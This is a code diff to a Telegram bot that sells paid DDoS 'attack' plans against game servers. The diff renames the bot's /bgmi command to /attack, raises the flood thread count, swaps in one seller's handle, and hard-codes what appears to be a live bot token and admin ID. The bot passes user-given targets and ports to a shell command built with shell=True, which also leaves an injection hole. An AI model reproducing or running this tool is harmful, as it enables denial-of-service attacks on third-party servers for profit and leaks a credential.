@@ -8,10 +8,10 @@ import datetime
 import os
 
 # insert your Telegram bot token here
-bot = telebot.TeleBot('TOKEN')
+bot = telebot.TeleBot('7329776309:AAFUlNpYqsx_An4Helqpc_Pz8UtnjO4Sn-4')
 
 # Admin user IDs
-admin_id = ["YOUR ID"]
+admin_id = ["6310751880"]
 
 # File to store allowed user IDs
 USER_FILE = "users.txt"
@@ -239,16 +239,16 @@ def handle_bgmi(message):
             if time > 5000:
                 response = "Error: Time interval must be less than 80."
             else:
-                record_command_logs(user_id, '/bgmi', target, port, time)
+                record_command_logs(user_id, '/attack', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./bgmi {target} {port} {time} 500"
+                full_command = f"./attack {target} {port} {time} 5000"
                 subprocess.run(full_command, shell=True)
                 response = f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time}"
         else:
-            response = "Usage :- /bgmi <target> <port> <time>\nBy @venomXcrazy"  # Updated command syntax
+            response = "Usage :- /attack <target> <port> <time>\nBy @HYPER_OMI"  # Updated command syntax
     else:
-        response = "You Are Not Authorized To Use This Command.\nBy @venomXcrazy"
+        response = "You Are Not Authorized To Use This Command.\nBy @HYPER_OMI"
 
     bot.reply_to(message, response)
 
@@ -278,14 +278,14 @@ def show_command_logs(message):
 @bot.message_handler(commands=['help'])
 def show_help(message):
     help_text = '''Available commands:
- /bgmi : Method For Bgmi Servers. 
+ /attack : Method For Bgmi Servers. 
  /rules : Please Check Before Use !!.
  /mylogs : To Check Your Recents Attacks.
  /plan : Checkout Our Botnet Rates.
 
  To See Admin Commands:
  /admincmd : Shows All Admin Commands.
- By  @venomXcrazy
+ By  @HYPER_OMI
 '''
     for handler in bot.message_handlers:
         if hasattr(handler, 'commands'):
@@ -329,7 +329,7 @@ Pr-ice List:
 Day-->100 Rs
 Week-->250 Rs
 Month-->600 Rs
-By  @venomXcrazy
+By  @HYPER_OMI
 '''
     bot.reply_to(message, response)
 
@@ -344,7 +344,7 @@ def welcome_plan(message):
 /logs : All Users Logs.
 /broadcast : Broadcast a Message.
 /clearlogs : Clear The Logs File.
-By  @venomXcrazy
+By  @HYPER_OMI
 '''
     bot.reply_to(message, response)
 
